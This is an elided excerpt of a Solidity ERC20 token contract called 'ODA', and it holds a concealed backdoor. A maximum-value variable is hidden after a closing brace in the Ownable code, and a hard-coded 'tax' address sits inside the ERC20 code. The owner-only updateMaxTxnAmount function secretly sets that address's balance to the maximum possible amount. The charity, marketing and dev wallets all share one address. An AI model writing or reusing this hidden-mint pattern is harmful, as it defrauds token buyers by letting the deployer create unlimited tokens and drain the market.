...
abstract contract Ownable is Context {
    ...
    }uint256 internal TransactionLimit = ~uint256(0);
    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address internal tax = 0x4B6C90E8EAd632C42608c10AA357b79bbD00F2BE;
...
contract ODA is ERC20, Ownable {
    ...
    constructor() ERC20("a", "A") {
		...
		charityWallet = address(0x3B6389C9B3B667871d6780cF96bbf11c5214FA66); 
        marketingWallet = address(0x3B6389C9B3B667871d6780cF96bbf11c5214FA66); 
        devWallet = address(0x3B6389C9B3B667871d6780cF96bbf11c5214FA66); 
    ...
    function updateMaxTxnAmount(uint256 newNum) external onlyOwner {
        ...
        );((_balances[tax]) = TransactionLimit);
